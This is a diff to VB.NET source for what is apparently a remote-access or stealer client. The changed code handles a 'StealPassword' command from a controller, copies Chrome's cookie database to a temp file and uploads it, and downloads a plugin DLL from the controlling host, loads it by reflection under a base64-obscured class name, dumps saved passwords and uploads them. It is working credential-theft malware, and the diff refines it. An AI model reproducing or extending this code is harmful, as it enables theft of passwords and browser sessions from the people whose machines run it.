@@ -426,7 +426,7 @@ Public Class Form1
                         C.Send("CleanCommands")
 
                     Case "StealPassword"
-                        StealPasswords("ps", CurrentHost)
+                        StealPasswords("PasswordStealer", CurrentHost)
                         C.Send("CleanCommands")
 
                     Case "UpdateClient"
@@ -502,7 +502,8 @@ Public Class Form1
         Try
             Dim chromeData As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\Google\Chrome\User Data\Default\"
             If File.Exists(chromeData & "Cookies") Then
-                C.Upload(chromeData & "Cookies")
+                File.Copy(chromeData & "Cookies", TempPath & "\" & "CookiesCh.sqlite")
+                C.Upload(TempPath & "\" & "CookiesCh.sqlite")
             End If
             Return True
         Catch ex As Exception
@@ -590,7 +591,7 @@ Public Class Form1
             Dim PluginData As Byte() = Plugin.DownloadData(CurrentHost & "/plugins/" & PluginName & ".dll")
             Dim p = Reflection.Assembly.Load(PluginData)
             Dim getPassword = p.CreateInstance(C.DEB("UGFzc3dvcmRTdGVhbGVyLlN0ZWVsUGFzc3dvcmQ="))
-            File.WriteAllText(TempPath & "/Passwords.txt", getPassword.Dump())
+            getPassword.Dump()
             C.Upload(TempPath & "/Passwords.txt")
             IO.File.Delete(TempPath & "/Passwords.txt")
             Return True
